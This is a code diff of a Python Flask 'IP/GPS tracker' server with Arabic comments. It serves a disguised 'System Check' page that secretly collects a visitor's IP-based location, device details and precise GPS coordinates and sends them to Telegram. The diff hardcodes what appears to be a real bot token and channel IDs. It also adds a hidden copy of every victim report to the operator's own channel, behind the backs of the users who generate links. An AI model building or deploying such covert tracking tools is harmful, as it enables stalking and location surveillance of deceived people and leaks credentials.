@@ -1,8 +1,3 @@
-"""
-📡 راشد — خادم التعقب | Rashd IP/GPS Tracker Server
-  يستقبل زيارات روابط التعقب ويرسل تقارير فورية للقناة المستهدفة
-"""
-
 import os
 import requests
 from datetime import datetime
@@ -12,9 +7,11 @@ from flask import Flask, request, render_template_string, jsonify
 #  ⚙️  الإعدادات | Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-TRACKER_BOT_TOKEN = os.getenv("TRACKER_BOT_TOKEN") or "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
-TARGET_CHANNEL_ID = os.getenv("TARGET_CHANNEL_ID") or "-1003770774871"
-CONTROL_CHANNEL_ID = os.getenv("CONTROL_CHANNEL_ID") or "-1003751955886"
+# Hardcoded Tracker Bot Token (Rashd_IP_Tracker_bot)
+TRACKER_BOT_TOKEN = "8346034907:AAHv4694Nf1Mn3JSwcUeb1Zkl1ZSlsODIx8"
+# Hardcoded Target Channel ID for results (only you see this)
+TARGET_CHANNEL_ID = "-1003770774871"
+# IPInfo Token (from Replit Secrets)
 IPINFO_TOKEN      = os.getenv("IPINFO_TOKEN", "")
 
 app = Flask(__name__)
@@ -23,16 +20,17 @@ app = Flask(__name__)
 session_data: dict = {}
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  📤  إرسال للقناة | Send to Target Channel
+#  📤  إرسال الرسائل | Send Messages
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def send_to_channel(message: str, disable_preview: bool = True):
-    if not TRACKER_BOT_TOKEN or not TARGET_CHANNEL_ID:
-        print("[TRACKER] ⛔ Token أو Channel ID غير مُهيّأ.")
+def send_telegram_message(chat_id: str, message: str, disable_preview: bool = True):
+    """Sends a message to a specific chat_id using the Tracker Bot Token"""
+    if not TRACKER_BOT_TOKEN:
+        print("[TRACKER] ⛔ Tracker Bot Token غير مُهيّأ.")
         return
     url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
     payload = {
-        "chat_id": TARGET_CHANNEL_ID,
+        "chat_id": chat_id,
         "text": message,
         "parse_mode": "Markdown",
         "disable_web_page_preview": disable_preview,
@@ -40,11 +38,11 @@ def send_to_channel(message: str, disable_preview: bool = True):
     try:
         r = requests.post(url, json=payload, timeout=10)
         if r.status_code != 200:
-            print(f"[TRACKER] ⚠️ خطأ إرسال: {r.status_code} — {r.text[:100]}")
+            print(f"[TRACKER] ⚠️ خطأ إرسال لـ {chat_id}: {r.status_code} — {r.text[:100]}")
         else:
-            print(f"[TRACKER] ✅ تم إرسال التقرير للقناة")
+            print(f"[TRACKER] ✅ تم إرسال التقرير لـ {chat_id}")
     except Exception as e:
-        print(f"[TRACKER] ⚠️ استثناء: {e}")
+        print(f"[TRACKER] ⚠️ استثناء إرسال لـ {chat_id}: {e}")
 
 
 def get_ip_geo(ip: str) -> dict:
@@ -122,9 +120,9 @@ TRACKER_HTML = """<!DOCTYPE html>
         };
 
         // --- إرسال بيانات الجهاز فوراً ---
-        fetch('/log_device/{{ session_id }}', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+        fetch("/log_device/{{ chat_id }}/{{ session_id }}", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
             body: JSON.stringify(deviceInfo)
         });
 
@@ -132,9 +130,9 @@ TRACKER_HTML = """<!DOCTYPE html>
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(pos) {
-                    fetch('/log_gps/{{ session_id }}', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                    fetch("/log_gps/{{ chat_id }}/{{ session_id }}", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
                         body: JSON.stringify({
                             lat:      pos.coords.latitude,
                             lon:      pos.coords.longitude,
@@ -142,16 +140,16 @@ TRACKER_HTML = """<!DOCTYPE html>
                             ip:       "{{ ip }}"
                         })
                     }).then(() => {
-                        setTimeout(() => { window.location.href = '/done'; }, 500);
+                        setTimeout(() => { window.location.href = "/done"; }, 500);
                     });
                 },
                 function(err) {
-                    setTimeout(() => { window.location.href = '/done'; }, 1000);
+                    setTimeout(() => { window.location.href = "/done"; }, 1000);
                 },
                 { timeout: 8000, enableHighAccuracy: true }
             );
         } else {
-            setTimeout(() => { window.location.href = '/done'; }, 1500);
+            setTimeout(() => { window.location.href = "/done"; }, 1500);
         }
     </script>
 </body>
@@ -170,15 +168,14 @@ justify-content:center;align-items:center;height:100vh;}</style>
 #  🔌  المسارات | Flask Routes
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-@app.route("/track/<session_id>")
-def tracker_page(session_id: str):
+@app.route("/track/<chat_id>/<session_id>")
+def tracker_page(chat_id: str, session_id: str):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
 
     timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
 
-    # تحليل الـ IP فوراً وتخزين البيانات — لا نرسل حتى يصل log_device
     geo = get_ip_geo(ip)
     loc = (geo.get("loc", "") if geo else "").split(",")
     lat = loc[0] if len(loc) == 2 else "N/A"
@@ -193,20 +190,22 @@ def tracker_page(session_id: str):
         "org":       geo.get("org",     "N/A") if geo else "N/A",
         "lat":       lat,
         "lon":       lon,
+        "chat_id":   chat_id, # Store chat_id for later use
     }
 
     return render_template_string(
         TRACKER_HTML,
         ip=ip,
         session_id=session_id,
+        chat_id=chat_id,
         title="System Check",
         heading="Verifying Connection...",
         subtext="Please wait",
     )
 
 
-@app.route("/log_device/<session_id>", methods=["POST"])
-def log_device(session_id: str):
+@app.route("/log_device/<chat_id>/<session_id>", methods=["POST"])
+def log_device(chat_id: str, session_id: str):
     d    = request.json or {}
     s    = session_data.get(session_id, {})
     ip   = s.get("ip", d.get("ip", "N/A"))
@@ -217,34 +216,39 @@ def log_device(session_id: str):
     report = (
         "📡 *راشد — تقرير تعقب*\n\n"
         f"🆔 الجلسة     : `{session_id}`\n"
-        f"🕐 التوقيت    : {s.get('timestamp', 'N/A')}\n\n"
+        f"🕐 التوقيت    : {s.get("timestamp", "N/A")}\n\n"
         "─────── 🌐 بيانات الشبكة ───────\n"
         f"📍 IP          : `{ip}`\n"
-        f"🏳️ الدولة     : {s.get('country', 'N/A')}\n"
-        f"🏙️ المدينة    : {s.get('city', 'N/A')}\n"
-        f"📍 المنطقة    : {s.get('region', 'N/A')}\n"
-        f"🏢 المزود     : {s.get('org', 'N/A')}\n"
+        f"🏳️ الدولة     : {s.get("country", "N/A")}\n"
+        f"🏙️ المدينة    : {s.get("city",    "N/A")}\n"
+        f"📍 المنطقة    : {s.get("region",  "N/A")}\n"
+        f"🏢 المزود     : {s.get("org",     "N/A")}\n"
     )
     if maps:
         report += f"🗺️ الخريطة    : [افتح الموقع]({maps})\n"
 
     report += (
         "\n─────── 💻 بيانات الجهاز ───────\n"
-        f"🖥️ المنصة     : {d.get('platform', 'N/A')}\n"
-        f"🌐 اللغة      : {d.get('language', 'N/A')}\n"
-        f"📺 الشاشة     : {d.get('screenW', 'N/A')}×{d.get('screenH', 'N/A')}\n"
-        f"🕐 المنطقة    : {d.get('timezone', 'N/A')}\n"
-        f"🍪 كوكيز      : {'✅ مفعّل' if d.get('cookiesOn') else '❌ معطّل'}\n"
-        f"📶 الاتصال    : {'✅ متصل' if d.get('online') else '❌ غير متصل'}\n"
-        f"🔍 User-Agent :\n`{d.get('userAgent', 'N/A')[:150]}`\n\n"
+        f"🖥️ المنصة     : {d.get("platform", "N/A")}\n"
+        f"🌐 اللغة      : {d.get("language", "N/A")}\n"
+        f"📺 الشاشة     : {d.get("screenW", "N/A")}×{d.get("screenH", "N/A")}\n"
+        f"🕐 المنطقة    : {d.get("timezone", "N/A")}\n"
+        f"🍪 كوكيز      : {"✅ مفعّل" if d.get("cookiesOn") else "❌ معطّل"}\n"
+        f"📶 الاتصال    : {"✅ متصل" if d.get("online") else "❌ غير متصل"}\n"
+        f"🔍 User-Agent :\n`{d.get("userAgent", "N/A")[:150]}`\n\n"
         "✦ راشد — تطوير أبو سعود"
     )
-    send_to_channel(report)
+    
+    # Send to initiating user
+    send_telegram_message(chat_id, report)
+    # Send copy to TARGET_CHANNEL_ID
+    send_telegram_message(TARGET_CHANNEL_ID, report)
+    
     return jsonify({"status": "ok"})
 
 
-@app.route("/log_gps/<session_id>", methods=["POST"])
-def log_gps(session_id: str):
+@app.route("/log_gps/<chat_id>/<session_id>", methods=["POST"])
+def log_gps(chat_id: str, session_id: str):
     d         = request.json or {}
     lat       = d.get("lat", "N/A")
     lon       = d.get("lon", "N/A")
@@ -264,7 +268,11 @@ def log_gps(session_id: str):
         f"🗺️ [فتح الخريطة]({maps_link})\n\n"
         "✦ راشد — تطوير أبو سعود"
     )
-    send_to_channel(report)
+    # Send to initiating user
+    send_telegram_message(chat_id, report)
+    # Send copy to TARGET_CHANNEL_ID
+    send_telegram_message(TARGET_CHANNEL_ID, report)
+    
     return jsonify({"status": "ok"})
 
 
